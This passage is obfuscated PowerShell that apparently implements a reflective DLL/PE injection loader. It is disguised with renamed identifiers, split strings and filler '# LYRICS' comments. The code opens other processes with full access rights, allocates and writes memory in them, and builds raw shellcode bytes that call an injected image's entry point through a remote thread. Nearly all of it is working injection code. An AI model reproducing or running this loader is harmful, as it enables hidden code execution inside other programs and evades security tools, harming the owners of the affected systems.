                $VAR0260   = $VAR099::( "{3}{0}{1}{2}" -f'ocH','Glo','bal','All').Invoke($VAR0237  )
# LYRICS864
                $VAR0042."FUN0`33"."Inv`o`kE"($VAR0260, $VAR0256, [UInt64]$VAR0237  )   |   &  (  "{0}{1}{2}" -f'Out','-','Null'  )
# LYRICS865
                $VAR0229 += , (  $VAR0256, $VAR0260, $VAR0237 )
# LYRICS866
# LYRICS867
# LYRICS868
                &( "{1}{0}" -f '010','FUN' ) -Bytes $VAR0235 -VAR0129 $VAR0257
                $VAR0257 = & ("{0}{2}{1}"-f 'F','5','UN00' ) $VAR0257 ( $VAR0235."LE`NgTh")
# LYRICS869
                $VAR099::( "{0}{3}{1}{4}{2}" -f'Stru','tu','eToPtr','c','r').Invoke(  $VAR0228, $VAR0257, $false )
                $VAR0257   =  &("{1}{0}{2}" -f 'UN00','F','5'  ) $VAR0257 $VAR0163
# LYRICS870
                &(  "{0}{1}"-f 'FUN0','10' ) -Bytes $VAR0236 -VAR0129 $VAR0257
                $VAR0257   =   & ("{2}{1}{0}" -f '005','UN','F'  ) $VAR0257 (  $VAR0236."Len`GtH"  )
# LYRICS871
                $VAR099::( "{2}{1}{3}{0}" -f'ToPtr','uctu','Str','re').Invoke( $VAR0259, $VAR0257, $false )
# LYRICS872
                $VAR0257  =   &  ("{1}{0}"-f 'UN005','F' ) $VAR0257 $VAR0163
# LYRICS873
                 &("{2}{1}{0}"-f '10','UN0','F'  ) -Bytes $VAR0258 -VAR0129 $VAR0257
# LYRICS874
                $VAR0042."Fu`N040"."i`NVoKE"(  $VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226 )   |     &( "{1}{0}" -f'ut-Null','O'  )
            }
# LYRICS875
# LYRICS876
             &(  "{0}{1}{3}{2}"-f'Wr','ite-Ou','ut','tp') $VAR0229
        }
# LYRICS877
# LYRICS878
# LYRICS879
        Function F`UN026 {
# LYRICS880
            Param(  
                [Parameter(  pOsitION   =  0, mAnDaTORY  =   $true)]
                [Array[]]
                $VAR0261,
# LYRICS881
                [Parameter(  pOsiTIoN =   1, MandATorY   =  $true)]
                [System.Object]
                $VAR0042,
# LYRICS882
                [Parameter( pOsITiOn  =  2, MAnDAtORY  =  $true  )]
                [System.Object]
                $VAR0041
            )
# LYRICS883
            [UInt32]$VAR0226   = 0
            foreach ( $VAR0262 in $VAR0261 ) {
# LYRICS884
                $Success  =  $VAR0042."FUN0`40"."IN`VO`kE"($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0041."cOnST008", [Ref]$VAR0226)
# LYRICS885
                if ( $Success -eq $false  ) {
                    Throw ("{2}{0}{1}"-f'O','R50','ERR')
                }
# LYRICS886
                $VAR0042."Fun0`33"."iNv`Oke"( $VAR0262[0], $VAR0262[1], [UInt64]$VAR0262[2]  ) |  &("{1}{0}{2}" -f '-Nul','Out','l')
# LYRICS887
# LYRICS888
                $VAR0042."fun0`40"."IN`Voke"($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0226, [Ref]$VAR0226 ) |  &(  "{1}{2}{0}"-f 'l','O','ut-Nul' )
            }
        }
# LYRICS889
# LYRICS890
# LYRICS891
# LYRICS892
# LYRICS893
        Function fU`N027 {
# LYRICS894
            Param( 
                [Parameter(  poSiTIon  =  0, mAnDatory  = $true )]
                [IntPtr]
                $VAR0263,
# LYRICS895
                [Parameter(  posItIOn   =  1, MandAtORy  =  $true )]
                [String]
                $VAR0187
             )
# LYRICS896
            $VAR010   =   &  (  "{0}{1}"-f 'FU','N001' )
# LYRICS897
            $VAR0041   =   &("{0}{1}{2}"-f 'FUN0','0','2')
# LYRICS898
            $VAR0126  =  &( "{0}{1}"-f'FUN01','7'  ) -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS899
# LYRICS900
            if ( $VAR0126."cONs`T0`31"."c`ONS`T122"."C`ONS`T107"."s`ize" -eq 0 ) {
# LYRICS901
                return $VAR095::"Z`ERO"
            }
            $VAR0264   =    &(  "{2}{1}{0}" -f '05','UN0','F' ) (  $VAR0263 ) ($VAR0126."cONst0`31"."cONS`T`122"."COn`St107"."C`ons`T074" )
# LYRICS902
            $VAR0265   =   $VAR099::"ptRTOS`TRuc`TUrE"(  $VAR0264, [Type]$VAR010."C`o`NsT155"  )
# LYRICS903
            for ($i =  0; $i -lt $VAR0265."coNs`T1`59" ;   $i++ ) {
# LYRICS904
                $VAR0266 =    & (  "{0}{1}" -f'FU','N005'  ) ( $VAR0263) ( $VAR0265."COnS`T1`61"  +  (  $i * $VAR099::"SIzE`of"( [Type][UInt32] ))  )
# LYRICS905
                $VAR0267  =   &  (  "{0}{2}{1}"-f 'F','5','UN00' ) (  $VAR0263 ) ( $VAR099::"PTrto`STR`U`CTUrE"($VAR0266, [Type][UInt32])  )
# LYRICS906
                $VAR0268   =   $VAR099::("{3}{0}{1}{2}{4}"-f 'rT','oStr','i','Pt','ngAnsi' ).Invoke( $VAR0267 )
# LYRICS907
                if (  $VAR0268 -ceq $VAR0187 ) {
# LYRICS908
# LYRICS909
                    $VAR0269  =   &( "{1}{2}{0}" -f'005','F','UN'  ) ( $VAR0263 ) ($VAR0265."C`oNst162"  +   ( $i * $VAR099::"sIz`EOf"([Type][UInt16]  )  ) )
# LYRICS910
                    $VAR0270   = $VAR099::"ptRT`oSTRU`Ctu`RE"( $VAR0269, [Type][UInt16])
# LYRICS911
                    $VAR0271 =  & (  "{0}{1}"-f 'FUN00','5'  ) ( $VAR0263 ) ( $VAR0265."c`OnsT160"   +   (  $VAR0270 * $VAR099::"sIZE`of"([Type][UInt32]  ) ))
# LYRICS912
                    $VAR0272 = $VAR099::"P`TrT`OST`RuCTurE"($VAR0271, [Type][UInt32] )
                    return &(  "{2}{0}{1}"-f '0','5','FUN0' ) (  $VAR0263) ( $VAR0272 )
                }
            }
# LYRICS913
            return $VAR095::"ZE`Ro"
        }
# LYRICS914
# LYRICS915
        Function F`UN028 {
# LYRICS916
            Param(
                [Parameter(   posITiON  =  0, MaNdatOry = $true )]
                [Byte[]]
                $VAR001,
# LYRICS917
                [Parameter(  poSITiOn =  1, MaNDATORy   = $false)]
                [String]
                $VAR004,
# LYRICS918
                [Parameter(  posItIoN  = 2, MaNdAToRY  =  $false)]
                [IntPtr]
                $VAR0161,
# LYRICS919
                [Parameter(  poSItIon   =  3)]
                [Bool]
                $VAR007 = $false
              )
# LYRICS920
            $VAR0163  =  $VAR099::"siz`eoF"( [Type][IntPtr])
# LYRICS921
# LYRICS922
            $VAR0041   =   &  (  "{1}{0}"-f'N002','FU')
            $VAR0042   =     & ( "{1}{0}{2}"-f 'UN','F','003')
# LYRICS923
            $VAR010  =  & ("{0}{1}"-f 'FUN00','1' )
# LYRICS924
            $VAR0210  =  $false
            if (  ($VAR0161 -ne $null) -and (  $VAR0161 -ne $VAR095::"z`ERo") ) {
# LYRICS925
                $VAR0210  = $true
            }
# LYRICS926
# LYRICS927
            $VAR0126  =     &  ("{1}{0}"-f '16','FUN0') -VAR001 $VAR001 -VAR010 $VAR010
# LYRICS928
            $VAR0196   =  $VAR0126."v`AR0196"
            $VAR0273 =   $true
# LYRICS929
            if (( [Int] $VAR0126."C`oNsT035" -band $VAR0041."c`ON`st024" ) -ne $VAR0041."CoN`St024" ) {
# LYRICS930
                $VAR0273   =  $false
            }
# LYRICS931
# LYRICS932
            $VAR0274   =  $true
# LYRICS933
            if ( $VAR0210 -eq $true ) {
                $VAR0168   = $VAR0042."fun041"."IN`V`oKe"(  $VAR0302  )
# LYRICS934
                $VAR0144  =   $VAR0042."Fun0`36"."iNV`OKE"(  $VAR0168, (  "{2}{1}{0}"-f'ss','w64Proce','IsWo'  ))
# LYRICS935
                if ($VAR0144 -eq $VAR095::"ZE`RO" ) {
                    Throw ( "{0}{2}{1}"-f'ER','R52','RO')
                }
# LYRICS936
                [Bool]$VAR0275   =  $false
                $Success   =  $VAR0042."fu`N055"."I`Nvo`KE"($VAR0161, [Ref]$VAR0275)
# LYRICS937
                if ($Success -eq $false) {
                    Throw (  "{1}{2}{0}" -f 'OR53','ER','R')
                }
# LYRICS938
                if ( ($VAR0275 -eq $true  ) -or (($VAR0275 -eq $false ) -and (  $VAR099::"SiZ`eOf"( [Type][IntPtr] ) -eq 4 ))  ) {
# LYRICS939
                    $VAR0274   =  $false
                }
# LYRICS940
# LYRICS941
                $VAR0276 = $true
                if (  $VAR099::"SizE`Of"(  [Type][IntPtr]  ) -ne 8  ) {
# LYRICS942
                    $VAR0276  =   $false
                }
                if (  $VAR0276 -ne $VAR0274  ) {
                    throw (  "{0}{1}" -f'ERROR','54' )
                }
            }
            else {
                if ( $VAR099::"Si`Z`EoF"( [Type][IntPtr]  ) -ne 8) {
# LYRICS943
                    $VAR0274  =  $false
                }
            }
            if ( $VAR0274 -ne $VAR0126."cONSt0`32") {
# LYRICS944
                Throw (  "{1}{2}{0}"-f 'R55','E','RRO'  )
            }
# LYRICS945
# LYRICS946
# LYRICS947
# LYRICS948
            [IntPtr]$VAR0277   =  $VAR095::"zE`RO"
# LYRICS949
            $VAR0278  =  ( [Int] $VAR0126."C`ON`ST035" -band $VAR0041."coNS`T023" ) -eq $VAR0041."coNsT023"
            if (( -not $VAR007 ) -and (  -not $VAR0278) ) {
# LYRICS950
                 & ("{1}{0}{2}"-f'it','Wr','e-Warning') ( "{0}{1}"-f 'ERROR5','6') -WarningAction (  "{1}{0}" -f'ue','Contin'  )
                [IntPtr]$VAR0277 = $VAR0196
            }
# LYRICS951
# LYRICS952
# LYRICS953
            $VAR0263   =  $VAR095::"Z`erO"              
# LYRICS954
            $VAR0279 = $VAR095::"Z`ero"     
            if ( $VAR0210 -eq $true ) {
# LYRICS955
                $VAR0263  =   $VAR0042."F`Un0`31"."I`NvokE"( $VAR095::"ze`Ro", [UIntPtr]$VAR0126."CoNsT033", $VAR0041."co`NSt001" -bor $VAR0041."cOnS`T002", $VAR0041."COnSt005")
# LYRICS956
# LYRICS957
                $VAR0279  =  $VAR0042."F`UN032"."IN`VOkE"($VAR0161, $VAR0277, [UIntPtr]$VAR0126."COns`T0`33", $VAR0041."Con`S`T001" -bor $VAR0041."C`oNSt002", $VAR0041."cON`St008"  )
# LYRICS958
                if (  $VAR0279 -eq $VAR095::"zE`Ro") {
                    Throw ("{0}{1}{2}"-f 'E','RRO','R57' )
                }
            }
            else {
                if (  $VAR0273 -eq $true) {
                    $VAR0263   = $VAR0042."fu`N031"."in`VOKe"( $VAR0277, [UIntPtr]$VAR0126."ConST0`33", $VAR0041."CoNS`T001" -bor $VAR0041."C`o`NST002", $VAR0041."cOnS`T005"  )
# LYRICS959
                }
                else {
                    $VAR0263 =  $VAR0042."fUn0`31"."IN`VOke"( $VAR0277, [UIntPtr]$VAR0126."CO`N`St033", $VAR0041."C`ONsT001" -bor $VAR0041."C`O`NsT002", $VAR0041."c`ONSt008"  )
# LYRICS960
                }
                $VAR0279   =  $VAR0263
            }
# LYRICS961
            [IntPtr]$VAR0128   =    &  (  "{0}{1}" -f 'FU','N005' ) (  $VAR0263 ) ( [Int64]$VAR0126."CONst0`33")
            if ( $VAR0263 -eq $VAR095::"Z`ero" ) {
                Throw ("{0}{1}{2}"-f'ERR','OR','58.' )
            }
# LYRICS962
            $VAR099::( "{1}{0}"-f 'y','Cop' ).Invoke(  $VAR001, 0, $VAR0263, $VAR0126."coN`ST034"  ) |    & ("{1}{0}{2}"-f'ut','O','-Null' )
# LYRICS963
# LYRICS964
# LYRICS965
            $VAR0126  =     & (  "{1}{0}"-f'N017','FU' ) -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS966
            $VAR0126  |  &  ("{2}{1}{0}" -f'ber','m','Add-Me'  ) -MemberType ( "{2}{0}{1}{3}" -f 'tePro','p','No','erty' ) -Name (  "{0}{1}{2}"-f'CO','NST','038'  ) -Value $VAR0128
            $VAR0126  |  &  (  "{1}{0}{2}"-f'embe','Add-M','r'  ) -MemberType ("{1}{0}{2}" -f 'o','N','teProperty' ) -Name ( "{1}{0}"-f'NST039','CO' ) -Value $VAR0279
# LYRICS967
# LYRICS968
            &  ( "{1}{2}{0}" -f '0','FUN','02' ) -VAR001 $VAR001 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010
# LYRICS969
# LYRICS970
# LYRICS971
              &  ("{1}{0}"-f'1','FUN02' ) -VAR0126 $VAR0126 -VAR0196 $VAR0196 -VAR0041 $VAR0041 -VAR010 $VAR010
# LYRICS972
# LYRICS973
# LYRICS974
            if ($VAR0210 -eq $true ) {
                  &  (  "{1}{0}" -f '022','FUN' ) -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041 -VAR0161 $VAR0161
            }
            else {
                 &  (  "{1}{0}"-f'022','FUN'  ) -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041
            }
# LYRICS975
# LYRICS976
# LYRICS977
            if (  $VAR0210 -eq $false) {
                if (  $VAR0273 -eq $true  ) {
# LYRICS978
                      &("{0}{1}" -f 'FU','N024'  ) -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR010 $VAR010
                }
# LYRICS979
            }
# LYRICS980
# LYRICS981
# LYRICS982
# LYRICS983
            if ( $VAR0210 -eq $true ) {
                [UInt32]$VAR0167  =   0
# LYRICS984
                $Success   =   $VAR0042."f`Un045"."Inv`oke"($VAR0161, $VAR0279, $VAR0263, [UIntPtr]( $VAR0126."co`Ns`T033"  ), [Ref]$VAR0167 )
# LYRICS985
                if ( $Success -eq $false  ) {
                    Throw ( "{0}{1}" -f'ERR','OR59')
                }
            }
# LYRICS986
# LYRICS987
# LYRICS988
            if ($VAR0126."c`ONS`T037" -ieq ("{1}{0}" -f'ibrary','L') ) {
# LYRICS989
                if ( $VAR0210 -eq $false  ) {
# LYRICS990
                    $VAR0280 =  &  ( "{0}{1}"-f 'FUN00','5'  ) ( $VAR0126."var0`263"  ) ( $VAR0126."cOnsT0`31"."CO`NST1`22"."CON`ST060")
# LYRICS991
                    $VAR0281  =   &(  "{0}{1}"-f 'FUN01','1') @([IntPtr], [UInt32], [IntPtr] ) ([Bool] )
# LYRICS992
                    $VAR0282  =  $VAR099::$VAR096($VAR0280, $VAR0281  )
# LYRICS993
                    $VAR0282."i`NvoKE"(  $VAR0126."VA`R0263", 1, $VAR095::"z`eRO"  )   |    & ( "{1}{2}{0}"-f 'l','Out','-Nul' )
                }
                else {
                    $VAR0280  =  &(  "{2}{1}{0}"-f'05','N0','FU' ) ( $VAR0279  ) ($VAR0126."ConsT0`31"."cON`S`T122"."CO`N`ST060" )
# LYRICS994
                    if ($VAR0126."CoN`S`T032" -eq $true) {
# LYRICS995
                        $VAR0283  = 83,72,137,227,102,131,228,0,72,185
# LYRICS996
                        $VAR0284  = 186,1,0,0,0,65,184,0,0,0,0,72,184
# LYRICS997
                        $VAR0285 =   255,208,72,137,220,91,195
                    }
                    else {
# LYRICS998
                        $VAR0283 =   83,137,227,131,228,240,185
# LYRICS999
                        $VAR0284   = 186,1,0,0,0,184,0,0,0,0,80,82,81,184
                        $VAR0285 = 255,208,137,220,91,195
                    }
                    $VAR0171   = $VAR0283."lEn`GtH"  +   $VAR0284."leN`GtH"   +  $VAR0285."Le`N`GTH"   +   ( $VAR0163 * 2)
# LYRICS1000
                    $VAR0172   =   $VAR099::( "{2}{1}{0}{3}" -f 'o','l','Al','cHGlobal'  ).Invoke(  $VAR0171)
                    $VAR0173   = $VAR0172
# LYRICS1001
                     & ( "{1}{0}" -f'0','FUN01' ) -Bytes $VAR0283 -VAR0129 $VAR0172
                    $VAR0172  =   &  ( "{1}{0}{2}" -f 'UN0','F','05'  ) $VAR0172 ($VAR0283."LE`Ngth" )
# LYRICS1002
                    $VAR099::( "{1}{4}{3}{0}{2}"-f 'r','St','eToPtr','ctu','ru').Invoke( $VAR0279, $VAR0172, $false  )
                    $VAR0172   =  &  (  "{1}{2}{0}"-f '5','F','UN00') $VAR0172 ( $VAR0163  )
                     &  ("{0}{2}{1}" -f 'FU','0','N01' ) -Bytes $VAR0284 -VAR0129 $VAR0172
# LYRICS1003
                    $VAR0172  =  &  ( "{0}{1}" -f 'F','UN005' ) $VAR0172 ( $VAR0284."L`enG`TH")
                    $VAR099::(  "{3}{1}{0}{2}"-f'uctureToP','r','tr','St'  ).Invoke(  $VAR0280, $VAR0172, $false)
# LYRICS1004
                    $VAR0172  =    &  ("{0}{1}"-f'FUN0','05' ) $VAR0172 (  $VAR0163 )
# LYRICS1005
                     &(  "{1}{0}" -f'010','FUN'  ) -Bytes $VAR0285 -VAR0129 $VAR0172
                    $VAR0172   =     &  (  "{1}{2}{0}"-f'005','F','UN') $VAR0172 ($VAR0285."l`en`GTh")
# LYRICS1006
                    $VAR0178   = $VAR0042."FU`N032"."I`Nv`Oke"( $VAR0161, $VAR095::"Ze`Ro", [UIntPtr][UInt64]$VAR0171, $VAR0041."cONst001" -bor $VAR0041."C`oNS`T002", $VAR0041."COn`St008" )
# LYRICS1007
                    if ( $VAR0178 -eq $VAR095::"z`Ero"  ) {
# LYRICS1008
                        Throw (  "{2}{1}{0}" -f'60','OR','ERR'  )
                    }
# LYRICS1009
                    $Success   = $VAR0042."fun045"."i`NVoKE"(  $VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167  )
# LYRICS1010
                    if (  ( $Success -eq $false) -or (  [UInt64]$VAR0167 -ne [UInt64]$VAR0171  ) ) {
                        Throw ( "{0}{1}" -f'ERR','OR61')
                    }
# LYRICS1011
                    $VAR0179  =    &  ("{0}{1}" -f 'FUN','014') -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS1012
                    $VAR0144   =   $VAR0042."Fun0`44"."i`NvOKe"($VAR0179, 20000  )
# LYRICS1013
                    if ($VAR0144 -ne 0) {
                        Throw (  "{2}{1}{0}"-f '62','OR','ERR'  )
                    }
# LYRICS1014
                    $VAR0042."F`Un039"."i`NVo`KE"( $VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041."C`o`Nst025" )  |     &( "{0}{1}"-f'O','ut-Null')
                }
            }
            elseif ( $VAR0126."Co`NST037" -ieq (  "{1}{0}{2}" -f'xec','E','utable') ) {
# LYRICS1015
                [IntPtr]$VAR0228  =   $VAR099::(  "{0}{2}{1}" -f'A','cHGlobal','llo'  ).Invoke( 1  )
# LYRICS1016
                $VAR099::(  "{1}{2}{0}"-f 'e','WriteB','yt').Invoke($VAR0228, 0, 0x00)
# LYRICS1017
                $VAR0286 =   & (  "{1}{0}"-f '5','FUN02' ) -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR0227 $VAR004 -VAR0228 $VAR0228
# LYRICS1018
# LYRICS1019
# LYRICS1020
                [IntPtr]$VAR0287 =  & ("{1}{0}" -f'N005','FU'  ) (  $VAR0126."V`Ar0263"  ) ($VAR0126."Con`st031"."cONSt`1`22"."CoNSt0`60"  )
# LYRICS1021
                $VAR0042."FuN0`56"."I`NVoKe"(  $VAR095::"ze`RO", $VAR095::"Z`eRo", $VAR0287, $VAR095::"Z`ERo", (  [UInt32]0  ), [Ref]([UInt32]0 ))   |    &  ( "{0}{1}"-f'Ou','t-Null'  )
# LYRICS1022
                while ( $true) {
                    [Byte]$VAR0288  =  $VAR099::( "{2}{1}{0}"-f'yte','adB','Re').Invoke(  $VAR0228, 0)
# LYRICS1023
                    if ($VAR0288 -eq 1  ) {
# LYRICS1024
                        & ( "{1}{0}" -f'6','FUN02') -VAR0261 $VAR0286 -VAR0042 $VAR0042 -VAR0041 $VAR0041
                        break
                    }
                    else {
# LYRICS1025
                         &(  "{0}{2}{1}"-f 'Sta','leep','rt-S') -Seconds 1
                    }
                }
            }
# LYRICS1026
            return @($VAR0126."V`AR0263", $VAR0279)
        }
# LYRICS1027
# LYRICS1028
        Function F`U`N029 {
# LYRICS1029
            Param(  
                [Parameter(PoSITIon  =  0, ManDatoRY   = $true )]
                [IntPtr]
                $VAR0263
            )
# LYRICS1030
# LYRICS1031
            $VAR0041 =  &( "{2}{1}{0}" -f '2','UN00','F' )
            $VAR0042   =  &  ( "{0}{1}" -f'FUN','003'  )
# LYRICS1032
            $VAR010 =  &  (  "{1}{0}"-f'N001','FU')
# LYRICS1033
            $VAR0126  = &(  "{1}{0}"-f '7','FUN01'  ) -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS1034
# LYRICS1035
            if ($VAR0126."cons`T031"."cons`T122"."COn`sT108"."s`ize" -gt 0  ) {
# LYRICS1036
                [IntPtr]$VAR0211 =    & ( "{0}{1}" -f 'FUN','005' ) ([Int64]$VAR0126."va`R0`263"  ) (  [Int64]$VAR0126."c`ON`st031"."conSt`122"."CO`N`sT108"."C`Onst0`74" )
# LYRICS1037
                while ( $true ) {
# LYRICS1038
                    $VAR0212  =   $VAR099::"p`T`RtOstRuCtURe"( $VAR0211, [Type]$VAR010."CoNs`T152")
# LYRICS1039
# LYRICS1040
                    if ($VAR0212."cONsT0`67" -eq 0 `
                            -and $VAR0212."C`O`Nst154" -eq 0 `
                            -and $VAR0212."COn`St1`53" -eq 0 `
                            -and $VAR0212."n`Ame" -eq 0 `
                            -and $VAR0212."CoNS`T0`71" -eq 0 ) {
                        break
                    }
# LYRICS1041
                    $VAR0164 =   $VAR099::"PtrTOSTriNg`A`NSi"(( &( "{0}{1}"-f'FUN0','05') ([Int64]$VAR0126."V`Ar0263") (  [Int64]$VAR0212."n`AME") ))
# LYRICS1042
                    $VAR0213  = $VAR0042."f`Un041"."iNvO`ke"($VAR0164 )
# LYRICS1043
# LYRICS1044
# LYRICS1045
                    $Success = $VAR0042."fU`N042"."iN`VOKe"($VAR0213  )
# LYRICS1046
# LYRICS1047
                    $VAR0211 =   & (  "{0}{1}{2}" -f 'FUN','0','05' ) ( $VAR0211 ) (  $VAR099::"si`Zeof"([Type]$VAR010."Con`St1`52" )  )
                }
            }
# LYRICS1048
# LYRICS1049
            $VAR0280  =     &  (  "{0}{1}"-f'F','UN005') ($VAR0126."VaR0`263") ($VAR0126."con`s`T031"."ConS`T1`22"."conS`T060")
# LYRICS1050
            $VAR0281   =    &  ("{1}{0}"-f'011','FUN') @([IntPtr], [UInt32], [IntPtr]) (  [Bool] )
# LYRICS1051
            $VAR0282 =   $VAR099::$VAR096( $VAR0280, $VAR0281 )
# LYRICS1052
            $VAR0282."INV`OKe"( $VAR0126."vaR0263", 0, $VAR095::"z`eRo") | &  ( "{1}{2}{0}" -f 'll','Out','-Nu'  )
# LYRICS1053
# LYRICS1054
            $Success   = $VAR0042."Fu`N038"."IN`VOkE"( $VAR0263, [UInt64]0, $VAR0041."CoNS`T025" )
# LYRICS1055
        }
# LYRICS1056
# LYRICS1057
        Function FU`N030 {
            $VAR0042 =   &  ( "{1}{0}"-f 'UN003','F' )
            $VAR010  =  &  ("{1}{0}" -f'UN001','F')
# LYRICS1058
            $VAR0041  =   &  ( "{0}{1}" -f'F','UN002' )
# LYRICS1059
            $VAR0161   = $VAR095::"ZE`Ro"
# LYRICS1060
# LYRICS1061
            if (  ($VAR005 -ne $null  ) -and (  $VAR005 -ne 0  ) -and ($VAR006 -ne $null ) -and ( $VAR006 -ne "" )) {
# LYRICS1062
                Throw ( "{0}{2}{1}"-f'ER','OR64','R')
            }
            elseif ($VAR006 -ne $null -and $VAR006 -ne "") {
# LYRICS1063
                $VAR0289   = @( & (  "{0}{1}{2}" -f'Ge','t-P','rocess' ) -Name $VAR006 -ErrorAction ("{2}{0}{1}" -f 'ntly','Continue','Sile' )  )
# LYRICS1064
                if (  $VAR0289."co`UNT" -eq 0 ) {
                    Throw ( 'ER'+ 'ROR65 '  +  "$VAR006")
                }
                elseif ( $VAR0289."c`OuNt" -gt 1) {
# LYRICS1065
                    $VAR0290   =   &  ( "{1}{3}{0}{2}" -f 'e','Get','ss','-Proc'  )  |   & ("{1}{3}{0}{2}"-f '-Obje','Wh','ct','ere' ) { $_."n`AME" -eq $VAR006 }  |  &("{2}{3}{0}{1}"-f 't-','Object','S','elec' ) ("{0}{1}{2}" -f 'Pr','oc','essName'), ('Id' ), ("{0}{2}{1}" -f 'Sess','nId','io'  )
# LYRICS1066
                     &( "{2}{0}{1}"-f'rite-','Output','W'  ) $VAR0290
                    Throw (  'E'  +  'RR'+'OR66 '  +  "$VAR006" )
                }
                else {
                    $VAR005   =  $VAR0289[0]."i`D"
                }
            }
# LYRICS1067
# LYRICS1068
# LYRICS1069
# LYRICS1070
# LYRICS1071
# LYRICS1072
# LYRICS1073
# LYRICS1074
# LYRICS1075
            if (  ( $VAR005 -ne $null) -and ($VAR005 -ne 0)  ) {
# LYRICS1076
                $VAR0161   =   $VAR0042."FUN043"."iNvO`KE"(0x001F0FFF, $false, $VAR005 )
# LYRICS1077
                if (  $VAR0161 -eq $VAR095::"Z`Ero"  ) {
                    Throw (  'ERROR' + '6' + '7' +  ': '  + "$VAR005"  )
                }
# LYRICS1078
            }
# LYRICS1079
# LYRICS1080
# LYRICS1081
            $VAR0263 = $VAR095::"Z`erO"
            if ($VAR0161 -eq $VAR095::"ze`RO" ) {
# LYRICS1082
                $VAR0291 =  & ("{1}{0}" -f '8','FUN02') -VAR001 $VAR001 -VAR004 $VAR004 -VAR007 $VAR007
            }
            else {
# LYRICS1083
                $VAR0291  =     &(  "{2}{0}{1}"-f '02','8','FUN') -VAR001 $VAR001 -VAR004 $VAR004 -VAR0161 $VAR0161 -VAR007 $VAR007
            }
            if (  $VAR0291 -eq $VAR095::"ZE`Ro" ) {
# LYRICS1084
                Throw ( "{0}{1}"-f 'ER','ROR68' )
            }
# LYRICS1085
            $VAR0263   = $VAR0291[0]
# LYRICS1086
            $VAR0292 =   $VAR0291[1] 
# LYRICS1087
# LYRICS1088
# LYRICS1089
            $VAR0126  =    &( "{1}{0}"-f'UN017','F') -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS1090
            if ( ( $VAR0126."CONST0`37" -ieq ( "{0}{1}" -f 'Libr','ary'  )  ) -and ( $VAR0161 -eq $VAR095::"ze`Ro"  ) ) {
# LYRICS1091
# LYRICS1092
# LYRICS1093
                switch ($VAR003  ) {
                    (  "{1}{2}{0}" -f'eStr','W','id'  ) {
# LYRICS1094
# LYRICS1095
                        [IntPtr]$VAR0293   = &("{0}{1}"-f'F','UN027' ) -VAR0263 $VAR0263 -FunctionName ("{0}{1}{2}"-f 'Wi','deStrF','unc' )
# LYRICS1096
                        if ($VAR0293 -eq $VAR095::"zE`Ro"  ) {
                            Throw (  "{2}{0}{1}" -f 'R','OR67','ER' )
                        }
                        $VAR0294 =   &  ("{0}{2}{1}" -f 'F','1','UN01' ) @(  ) ([IntPtr])
# LYRICS1097
                        $VAR0295  =  $VAR099::$VAR096($VAR0293, $VAR0294 )
# LYRICS1098
                        [IntPtr]$VAR0296  = $VAR0295."I`NvokE"(  )
# LYRICS1099
                        $VAR0297   = $VAR099::( "{0}{4}{2}{1}{3}"-f'P','ng','ToStri','Uni','tr').Invoke($VAR0296)
                        & (  "{2}{0}{1}"-f't','put','Write-Ou'  ) $VAR0297
                    }
# LYRICS1100
                    'Str' {
# LYRICS1101
                        [IntPtr]$VAR0298   =   &("{1}{0}" -f'027','FUN'  ) -VAR0263 $VAR0263 -FunctionName ("{1}{2}{0}"-f'nc','St','ringFu' )
# LYRICS1102
                        if (  $VAR0298 -eq $VAR095::"Z`erO" ) {
                            Throw ( "{0}{1}" -f'ERR','OR68')
                        }
                        $VAR0299   =    &(  "{0}{1}"-f 'FUN','011' ) @(  ) ( [IntPtr])
# LYRICS1103
                        $VAR0300 =  $VAR099::$VAR096(  $VAR0298, $VAR0299)
# LYRICS1104
                        [IntPtr]$VAR0296 = $VAR0300."Inv`oKe"()
# LYRICS1105
                        $VAR0297 =  $VAR099::(  "{1}{0}{2}{3}"-f 'r','Pt','ToSt','ringAnsi'  ).Invoke(  $VAR0296  )
# LYRICS1106
                        &  (  "{2}{1}{0}" -f't','-Outpu','Write'  ) $VAR0297
                    }
# LYRICS1107
                    (  "{1}{2}{0}" -f 'put','No','Out') {
# LYRICS1108
                        [IntPtr]$VAR0301  =  & (  "{0}{2}{1}" -f'F','N027','U' ) -VAR0263 $VAR0263 -FunctionName ( "{1}{0}{2}"-f 'idFu','Vo','nc')
                        if ( $VAR0301 -eq $VAR095::"Z`ERo") {
# LYRICS1109
                            Throw (  "{2}{0}{1}"-f 'R','OR69','ER')
                        }
                        $VAR0302 =    &( "{0}{1}"-f'FU','N011'  ) @( ) (  [Void] )
# LYRICS1110
                        $VAR0303  = $VAR099::$VAR096( $VAR0301, $VAR0302)
# LYRICS1111
                        $VAR0303."i`Nvoke"( )  |   & ("{0}{1}"-f'Out-','Null' )
                    }
                    ("{2}{1}{0}{3}"-f'Se','ault','Def','ttings'  ) {
# LYRICS1112
                          &  ("{2}{1}{0}{3}"-f'te','ri','W','-Verbose') ("{1}{0}{2}"-f'RROR7','E','0'  )
                    }
                }
# LYRICS1113
# LYRICS1114
# LYRICS1115
            }
# LYRICS1116
            elseif ( ($VAR0126."ConSt037" -ieq ( "{2}{1}{0}"-f'ry','ibra','L'  )  ) -and ( $VAR0161 -ne $VAR095::"z`ERo"  )) {
# LYRICS1117
                $VAR0301   =   &("{0}{1}"-f 'FUN','027' ) -VAR0263 $VAR0263 -FunctionName (  "{2}{0}{1}" -f 'dFu','nc','Voi'  )
# LYRICS1118
